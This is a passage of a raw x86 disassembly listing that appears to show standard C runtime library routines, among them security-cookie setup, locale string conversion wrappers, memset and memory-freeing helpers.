  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
